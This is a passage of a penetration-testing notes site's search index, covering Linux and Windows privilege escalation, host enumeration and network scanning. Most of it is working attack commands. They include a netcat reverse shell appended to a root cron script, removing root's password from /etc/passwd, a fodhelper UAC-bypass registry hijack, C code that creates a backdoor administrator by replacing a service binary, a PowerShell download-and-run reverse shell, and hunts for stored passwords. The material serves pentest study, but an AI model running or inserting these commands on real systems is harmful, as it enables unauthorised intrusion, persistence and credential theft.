>/dev/null find / -name *backup* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null Port Tunneling Local Tunneling ssh -L $myport :127.0.0.1:5985 hades@192.168.11.133 -i id_rsa Remote Tunneling ssh -R $myip : $myport :127.0.0.1:5985 kali@ $myip -i kali-idrsa SSH ESCAPE CHARACTERS ~C to type ssh command Generate SSH Key ssh-keygen -t rsa cp id_rsa.pub authorized_keys","title":"Unix Escalation"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#linux-privilege-escalation","text":"","title":"Linux Privilege Escalation"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#insecure-file-permissions","text":"","title":"Insecure File Permissions"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#cronjob-file","text":"Cronjob file check.sh overwrite grep \"CRON\" /var/log/* 2 >/dev/null File check.sh running as root every 1 minute. ls -l check.sh Can change file check.sh with user permission. echo \"rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f\" >> check.sh","title":"Cronjob file"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#file-etcpasswd","text":"File /etc/passwd can be modify by user permission. ls -l /etc/passwd -rw-rw-rw- 1 root root <snip> /etc/passwd Remove x in the file means root requires no password anymore, sed 's/root:x/root:/' /etc/passwd > /etc/passwd Go to root su Generate password for new user openssl passwd -1 -salt hades leecybersec echo toor: $1$hades$KKCtexC .plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passwd https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation","title":"File /etc/passwd"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#check-sudo-access","text":"$ sudo -l [ sudo ] password for Hades: Matching Defaults entries for pentesterlab on 7358cafc3ebe: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/bash Mix cp/chown and chmod https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial/ https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/ sudo -l Matching Defaults entries for Hades: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/chmod, /bin/cp","title":"Check sudo access"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#checking-docker-container","text":"root@315d7648a173:/# ls -lah <snip> -rwxr-xr-x 1 root root 0 Jun 9 13 :01 .dockerenv mkdir -p /mnt/hola mount /dev/sda1 /mnt/hola mount /dev/sda2 /mnt/hola mount /dev/sda3 /mnt/hola","title":"Checking docker container"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#kernel-exploit","text":"","title":"Kernel Exploit"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#os-version-architecture","text":"cat /etc/issue ; uname -r ; arch","title":"OS Version &amp; Architecture"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#compile-exploit-in-cc","text":"Compile file $ gcc -m32 Size.c -o x86-S $ ./x86-S Size = 4 $ gcc Size.c -o x64-S $ ./x64-S Size = 8 File Size.c #include <stdio.h> int main () { printf ( \"Size = %lu\" , sizeof ( size_t )); }","title":"Compile exploit in C/C++"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#for-example","text":"Full-Nelson.c Exploit Kernel","title":"For Example"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#more-reference","text":"","title":"More Reference"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#history-bashrc-backup","text":"find / -name *history* 2 >/dev/null find / -name *backup* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null","title":"history, bashrc, backup"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#port-tunneling","text":"Local Tunneling ssh -L $myport :127.0.0.1:5985 hades@192.168.11.133 -i id_rsa Remote Tunneling ssh -R $myip : $myport :127.0.0.1:5985 kali@ $myip -i kali-idrsa SSH ESCAPE CHARACTERS ~C to type ssh command","title":"Port Tunneling"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html#generate-ssh-key","text":"ssh-keygen -t rsa cp id_rsa.pub authorized_keys","title":"Generate SSH Key"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html","text":"Windows Privilege Escalation Bypass UAC via registry hijacking Check Mandatory Level whoami /groups Run cmd.exe as Administrator to get High Mandatory Level powershell.exe Start-Process cmd.exe -Verb runAs C:\\Windows\\System32\\fodhelper.exe REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /v DelegateExecute /t REG_SZ REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /d \"C:\\Users\\windows_10_1903_x64\\Desktop\\shell.exe\" /f Insecure File Permissions Get Server and Path to running Powershell >>> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object { $_ .State -like 'Running' } Check permission icacls \"C:\\Windows\\system32\\wbem\\WmiApSrv.exe\" refer icacls icacls Mask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access Overwrite file if have F or W permission. Compile code adduser.c i686-w64-mingw32-gcc adduser.c -o adduser.exe adduser.c #include <stdlib.h> int main () { int add ; add = system ( \"net user backup Adm1nP@ssWD /add\" ); add = system ( \"net localgroup administrators backup /add\" ); return 0 ; } Move file adduser.exe move adduser.exe \"C:\\Program Files\\Serviio\\bin\\ServiioService.exe\" Check StartMode for service wmic service where caption = \"Serviio\" get name, caption, state, startmode Check rights for restart system whoami /priv Restart system shutdown /r /t 0 Check Administrators group net localgroup Administrators Leveraging Unquoted Service Paths wmic service get displayname,pathname C: \\P rogram.exe C: \\P rogram Files \\M y.exe C: \\P rogram Files \\M y Program \\M y.exe C: \\P rogram Files \\M y Program \\M y service \\s ervice.exe Kernel Exploit OS Version & Architecture systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" Driver Enumeration driverquery /v For Example Vulnerability in Ancillary Function Driver RGNOBJ Integer Overflow CVE-2015-1701 More Reference https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated Add Local Admin User net user /add <user> <pass> net localgroup administrators <user> /add Run CMD as Admin powershell.exe Start-Process cmd.exe -Verb runAs Clear text stored reg query HKLM /f pass /t REG_SZ /s","title":"Windows Escalation"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#windows-privilege-escalation","text":"","title":"Windows Privilege Escalation"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#bypass-uac-via-registry-hijacking","text":"Check Mandatory Level whoami /groups Run cmd.exe as Administrator to get High Mandatory Level powershell.exe Start-Process cmd.exe -Verb runAs C:\\Windows\\System32\\fodhelper.exe REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /v DelegateExecute /t REG_SZ REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /d \"C:\\Users\\windows_10_1903_x64\\Desktop\\shell.exe\" /f","title":"Bypass UAC via registry hijacking"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#insecure-file-permissions","text":"Get Server and Path to running Powershell >>> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object { $_ .State -like 'Running' } Check permission icacls \"C:\\Windows\\system32\\wbem\\WmiApSrv.exe\" refer icacls icacls Mask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access Overwrite file if have F or W permission. Compile code adduser.c i686-w64-mingw32-gcc adduser.c -o adduser.exe adduser.c #include <stdlib.h> int main () { int add ; add = system ( \"net user backup Adm1nP@ssWD /add\" ); add = system ( \"net localgroup administrators backup /add\" ); return 0 ; } Move file adduser.exe move adduser.exe \"C:\\Program Files\\Serviio\\bin\\ServiioService.exe\" Check StartMode for service wmic service where caption = \"Serviio\" get name, caption, state, startmode Check rights for restart system whoami /priv Restart system shutdown /r /t 0 Check Administrators group net localgroup Administrators","title":"Insecure File Permissions"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#leveraging-unquoted-service-paths","text":"wmic service get displayname,pathname C: \\P rogram.exe C: \\P rogram Files \\M y.exe C: \\P rogram Files \\M y Program \\M y.exe C: \\P rogram Files \\M y Program \\M y service \\s ervice.exe","title":"Leveraging Unquoted Service Paths"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#kernel-exploit","text":"","title":"Kernel Exploit"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#os-version-architecture","text":"systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\"","title":"OS Version &amp; Architecture"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#driver-enumeration","text":"driverquery /v","title":"Driver Enumeration"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#for-example","text":"Vulnerability in Ancillary Function Driver RGNOBJ Integer Overflow CVE-2015-1701","title":"For Example"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#more-reference","text":"https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated","title":"More Reference"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#add-local-admin-user","text":"net user /add <user> <pass> net localgroup administrators <user> /add","title":"Add Local Admin User"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#run-cmd-as-admin","text":"powershell.exe Start-Process cmd.exe -Verb runAs","title":"Run CMD as Admin"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html#clear-text-stored","text":"reg query HKLM /f pass /t REG_SZ /s","title":"Clear text stored"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html","text":"Linux Privilege Escalation Upgrade Shell PayloadsAllTheThings: Spawn TTY Shell Spawning a TTY Shell python python -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/bin/sh\")' script /usr/bin/script -qc /bin/sh /dev/null perl perl -e 'exec \"/bin/sh\";' perl: exec \"/bin/sh\" ; ruby ruby: exec \"/bin/sh\" os.system echo os.system ( '/bin/bash' ) sh -i /bin/sh -i lua lua: os.execute ( '/bin/sh' ) In an editor (From within IRB) exec \"/bin/sh\" (From within vi) :!bash (From within vi) :set shell = /bin/bash:shell (From within nmap) !sh Export Terminal export TERM = xterm ^Z stty raw -echo ; fg User Enumeration Current User whoami id Other Users cat /etc/passwd Which ones have a valid shell grep -vE \"nologin|false\" /etc/passwd Folder pwd ; ls -la Hostname hostname OS Version & Architecture What's the OS? cat /etc/issue cat /etc/*-release lsb_release -a ( Debian based OSs ) Kernel version and Architecture uname -a Processes and Services ps axu How to check if port is in use in sudo lsof -i -P -n | grep LISTEN List all enabled services from systemctl systemctl list-unit-files | grep enabled Networking Enumeration Interface and Routable ip a /sbin/route Active network connection ss -anp netstat -antup Firewall and Rules grep -Hs iptables /etc/* Scheduled Tasks ls -lah /etc/cron* cat /etc/crontab grep \"CRON\" /var/log/* 2 >/dev/null Installed and Patch Levels dpkg -l ( Debian based OSs ) rpm -qa ( CentOS / openSUSE ) uname -a Readable/Writable find / -writable -type d 2 >/dev/null Unmounted Disks List all mounted files system mount cat /etc/fstab List all disk /bin/lsblk Mount disk sudo mount -o nolock 192 .168.11.131:/share ~/share Device Drivers & Kernel Modules lsmod /sbin/modinfo <name> Binaries That AutoElevate find / -perm -1000 -type d 2 >/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find / -perm -g = s -type f 2 >/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u = s -type f 2 >/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g = s -o -perm -u = s -type f 2 >/dev/null # SGID or SUID for i in ` locate -r \"bin $ \" ` ; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2 >/dev/null ; done # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find / -perm -g = s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2 >/dev/null Enumeration Tools Basic Linux Privilege Escalation GTFOBins pspy LinEnum.sh LinEnum.sh lse.sh lse.sh unix-privesc-check ./unix-privesc-check standard More Reference Check history, bashrc, backup find / -name *history* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null Port Tunneling ssh -R $myip :8080:127.0.0.1:8080 kali@ $myip ssh -L 80 :ip:80 user@ip","title":"Unix Enumeration"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#linux-privilege-escalation","text":"","title":"Linux Privilege Escalation"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#upgrade-shell","text":"PayloadsAllTheThings: Spawn TTY Shell","title":"Upgrade Shell"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#spawning-a-tty-shell","text":"python python -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/bin/sh\")' script /usr/bin/script -qc /bin/sh /dev/null perl perl -e 'exec \"/bin/sh\";' perl: exec \"/bin/sh\" ; ruby ruby: exec \"/bin/sh\" os.system echo os.system ( '/bin/bash' ) sh -i /bin/sh -i lua lua: os.execute ( '/bin/sh' ) In an editor (From within IRB) exec \"/bin/sh\" (From within vi) :!bash (From within vi) :set shell = /bin/bash:shell (From within nmap) !sh","title":"Spawning a TTY Shell"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#export-terminal","text":"export TERM = xterm ^Z stty raw -echo ; fg","title":"Export Terminal"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#user-enumeration","text":"Current User whoami id Other Users cat /etc/passwd Which ones have a valid shell grep -vE \"nologin|false\" /etc/passwd Folder pwd ; ls -la Hostname hostname","title":"User Enumeration"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#os-version-architecture","text":"What's the OS? cat /etc/issue cat /etc/*-release lsb_release -a ( Debian based OSs ) Kernel version and Architecture uname -a","title":"OS Version &amp; Architecture"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#processes-and-services","text":"ps axu How to check if port is in use in sudo lsof -i -P -n | grep LISTEN List all enabled services from systemctl systemctl list-unit-files | grep enabled","title":"Processes and Services"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#networking-enumeration","text":"","title":"Networking Enumeration"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#interface-and-routable","text":"ip a /sbin/route","title":"Interface and Routable"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#active-network-connection","text":"ss -anp netstat -antup","title":"Active network connection"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#firewall-and-rules","text":"grep -Hs iptables /etc/*","title":"Firewall and Rules"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#scheduled-tasks","text":"ls -lah /etc/cron* cat /etc/crontab grep \"CRON\" /var/log/* 2 >/dev/null","title":"Scheduled Tasks"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#installed-and-patch-levels","text":"dpkg -l ( Debian based OSs ) rpm -qa ( CentOS / openSUSE ) uname -a","title":"Installed and Patch Levels"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#readablewritable","text":"find / -writable -type d 2 >/dev/null","title":"Readable/Writable"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#unmounted-disks","text":"List all mounted files system mount cat /etc/fstab List all disk /bin/lsblk Mount disk sudo mount -o nolock 192 .168.11.131:/share ~/share","title":"Unmounted Disks"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#device-drivers-kernel-modules","text":"lsmod /sbin/modinfo <name>","title":"Device Drivers &amp; Kernel Modules"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#binaries-that-autoelevate","text":"find / -perm -1000 -type d 2 >/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find / -perm -g = s -type f 2 >/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u = s -type f 2 >/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g = s -o -perm -u = s -type f 2 >/dev/null # SGID or SUID for i in ` locate -r \"bin $ \" ` ; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2 >/dev/null ; done # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find / -perm -g = s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2 >/dev/null","title":"Binaries That AutoElevate"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#enumeration-tools","text":"Basic Linux Privilege Escalation GTFOBins pspy LinEnum.sh LinEnum.sh lse.sh lse.sh unix-privesc-check ./unix-privesc-check standard","title":"Enumeration Tools"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#more-reference","text":"","title":"More Reference"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#check-history-bashrc-backup","text":"find / -name *history* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null","title":"Check history, bashrc, backup"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html#port-tunneling","text":"ssh -R $myip :8080:127.0.0.1:8080 kali@ $myip ssh -L 80 :ip:80 user@ip","title":"Port Tunneling"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html","text":"Windows Privilege Escalation Upgrade Shell Fully interactive reverse shell on Windows Server Side stty raw -echo ; ( stty size ; cat ) | sudo nc -lvnp myport Client Side powershell IEX ( IWR http://myip/Invoke-ConPtyShell.ps1 -UseBasicParsing ) ; Invoke-ConPtyShell myip myport File Invoke-ConPtyShell.ps1 User Enumeration Current User whoami net user <username> whoami /groups Other Users net user net localgroup administrators Folder dir Hostname hostname OS Version & Architecture What's the OS? What version? What architecture? systeminfo systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" Processes and Services tasklist /SVC Networking Enumeration ipconfig /all route print Active network connection netstat -ano Firewall Status and Rules netsh advfirewall show currentprofile netsh advfirewall firewall show rule name = all Scheduled Tasks schtasks /query /fo LIST /v schtasks /query /fo LIST /v | findstr /B /C: \"Task To Run\" /C: \"Next Run Time\" /C: \"Last Run Time\" /C: \"Schedule Type\" /C: \"Start Time\" /C: \"Start Date\" Installed and Patch Levels wmic product get name, version, vendor dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" Patch Levels wmic qfe get Caption, Description, HotFixID, InstalledOn Readable/Writable accesschk.exe -accepteula accesschk.exe -uws <user> \"C:\\Program Files\" Using powershell >>> Get-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ? { $_ .AccessToString -match \"Everyone\\sAllow\\s\\sModify\" } Get-ChildItem \"C:\\Users\\windows_10_1903_x64\\Desktop\" -Recurse | Get-ACL | findstr /C: \"<user-name>\" Unmounted Disks mountvol Device Drivers & Kernel Modules Using powershell >>> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name' , 'Start Mode' , Path Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object { $_ .DeviceName -like \"*VMware*\" } Binaries That AutoElevate AlwaysInstallElevated reg query HKEY_CURRENT_USER \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKEY_LOCAL_MACHINE \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKLM \\S OFTWARE \\P olicies \\M icrosoft \\W indows \\I nstaller Enumeration Tools windows-privesc-check windows-privesc-check2.exe --help winPEASexe winPEASx86.exe More Reference https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated Add Local Admin User net user /add <user> <pass> net localgroup administrators <user> /add Run CMD as Admin powershell.exe Start-Process cmd.exe -Verb runAs Clear text stored reg query HKLM /f pass /t REG_SZ /s","title":"Windows Enumeration"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#windows-privilege-escalation","text":"","title":"Windows Privilege Escalation"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#upgrade-shell","text":"Fully interactive reverse shell on Windows Server Side stty raw -echo ; ( stty size ; cat ) | sudo nc -lvnp myport Client Side powershell IEX ( IWR http://myip/Invoke-ConPtyShell.ps1 -UseBasicParsing ) ; Invoke-ConPtyShell myip myport File Invoke-ConPtyShell.ps1","title":"Upgrade Shell"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#user-enumeration","text":"Current User whoami net user <username> whoami /groups Other Users net user net localgroup administrators Folder dir Hostname hostname","title":"User Enumeration"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#os-version-architecture","text":"What's the OS? What version? What architecture? systeminfo systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\"","title":"OS Version &amp; Architecture"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#processes-and-services","text":"tasklist /SVC","title":"Processes and Services"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#networking-enumeration","text":"ipconfig /all route print Active network connection netstat -ano","title":"Networking Enumeration"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#firewall-status-and-rules","text":"netsh advfirewall show currentprofile netsh advfirewall firewall show rule name = all","title":"Firewall Status and Rules"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#scheduled-tasks","text":"schtasks /query /fo LIST /v schtasks /query /fo LIST /v | findstr /B /C: \"Task To Run\" /C: \"Next Run Time\" /C: \"Last Run Time\" /C: \"Schedule Type\" /C: \"Start Time\" /C: \"Start Date\"","title":"Scheduled Tasks"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#installed-and-patch-levels","text":"wmic product get name, version, vendor dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" Patch Levels wmic qfe get Caption, Description, HotFixID, InstalledOn","title":"Installed and Patch Levels"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#readablewritable","text":"accesschk.exe -accepteula accesschk.exe -uws <user> \"C:\\Program Files\" Using powershell >>> Get-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ? { $_ .AccessToString -match \"Everyone\\sAllow\\s\\sModify\" } Get-ChildItem \"C:\\Users\\windows_10_1903_x64\\Desktop\" -Recurse | Get-ACL | findstr /C: \"<user-name>\"","title":"Readable/Writable"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#unmounted-disks","text":"mountvol","title":"Unmounted Disks"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#device-drivers-kernel-modules","text":"Using powershell >>> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name' , 'Start Mode' , Path Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object { $_ .DeviceName -like \"*VMware*\" }","title":"Device Drivers &amp; Kernel Modules"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#binaries-that-autoelevate","text":"","title":"Binaries That AutoElevate"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#alwaysinstallelevated","text":"reg query HKEY_CURRENT_USER \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKEY_LOCAL_MACHINE \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKLM \\S OFTWARE \\P olicies \\M icrosoft \\W indows \\I nstaller","title":"AlwaysInstallElevated"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#enumeration-tools","text":"windows-privesc-check windows-privesc-check2.exe --help winPEASexe winPEASx86.exe","title":"Enumeration Tools"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#more-reference","text":"https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated","title":"More Reference"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#add-local-admin-user","text":"net user /add <user> <pass> net localgroup administrators <user> /add","title":"Add Local Admin User"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#run-cmd-as-admin","text":"powershell.exe Start-Process cmd.exe -Verb runAs","title":"Run CMD as Admin"},{"location":"penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html#clear-text-stored","text":"reg query HKLM /f pass /t REG_SZ /s","title":"Clear text stored"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html","text":"Scanning Network Sweeping Scripting here ping #!/bin/bash if [ -z $1 ] ; then echo \"Usage: $0 <SubIP>\" exit fi for ip in $( seq 1 254 ) ; do ping -c 1 $1 . $ip | grep \"bytes from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 & done nmap nmap -sn 192 .168.11.0/24 netdiscover netdiscover -r 192 .168.11.0/24 Open Port Scanning Scripting here Netcat TCP nc -nv -w 1 -z $ip 1 -65535 UDP nc -nv -w 1 -z -u $ip 1 -65535 Masscan TCP sudo masscan -i tun0 $ip -p0-65535 --rate 1000 sudo masscan -p80 192 .168.11.0/24 UDP masscan -pU 53 $ip Nmap Quick scan nmap --top-port 100 $ip Grep ports ports = $( nmap -p- --min-rate 1000 $ip | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) TCP connect scan (-sT) takes much longer to complete than SYN scan (-sS). SYN Scan sudo nmap -sS -p- $ip TCP Connect Scan sudo nmap -sT -p- $ip UDP Scan sudo nmap -sU -p- $ip Service Enumeration Scripting here Common Services nmap -sC -sV -p $ports $ip nmap -sC -sV -A -p $ports $ip OS Fingerprinting sudo nmap -O $ip NSE Scripts vuln sudo nmap --script = vuln $ip smb-os-discovery sudo nmap --script = smb-os-discovery $ip smb-vul* sudo nmap --script smb-vul* -p 139 ,445 $ip ms-sql-brute sudo nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host> dns-zone-transfer sudo nmap --script = dns-zone-transfer -p 53 leecybersec.com Nmap Cheat Sheet","title":"Active Scanning"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html#scanning","text":"","title":"Scanning"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html#network-sweeping","text":"Scripting here ping #!/bin/bash if [ -z $1 ] ; then echo \"Usage: $0 <SubIP>\" exit fi for ip in $( seq 1 254 ) ; do ping -c 1 $1 . $ip | grep \"bytes from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 & done nmap nmap -sn 192 .168.11.0/24 netdiscover netdiscover -r 192 .168.11.0/24","title":"Network Sweeping"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html#open-port-scanning","text":"Scripting here Netcat TCP nc -nv -w 1 -z $ip 1 -65535 UDP nc -nv -w 1 -z -u $ip 1 -65535 Masscan TCP sudo masscan -i tun0 $ip -p0-65535 --rate 1000 sudo masscan -p80 192 .168.11.0/24 UDP masscan -pU 53 $ip Nmap Quick scan nmap --top-port 100 $ip Grep ports ports = $( nmap -p- --min-rate 1000 $ip | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// ) TCP connect scan (-sT) takes much longer to complete than SYN scan (-sS). SYN Scan sudo nmap -sS -p- $ip TCP Connect Scan sudo nmap -sT -p- $ip UDP Scan sudo nmap -sU -p- $ip","title":"Open Port Scanning"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html#service-enumeration","text":"Scripting here Common Services nmap -sC -sV -p $ports $ip nmap -sC -sV -A -p $ports $ip","title":"Service Enumeration"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html#os-fingerprinting","text":"sudo nmap -O $ip","title":"OS Fingerprinting"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html#nse-scripts","text":"vuln sudo nmap --script = vuln $ip smb-os-discovery sudo nmap --script = smb-os-discovery $ip smb-vul* sudo nmap --script smb-vul* -p 139 ,445 $ip ms-sql-brute sudo nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host> dns-zone-transfer sudo nmap --script = dns-zone-transfer -p 53 leecybersec.com","title":"NSE Scripts"},{"location":"penetration-testing/external-internal/reconnaissance/active-scanning.html#nmap-cheat-sheet","text":"","title":"Nmap Cheat Sheet"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html","text":"Information Gathering OSINT Framework Maltego Shodan Searching Shodan For Fun And Profit city : find devices in a particular city country : find devices in a particular country geo 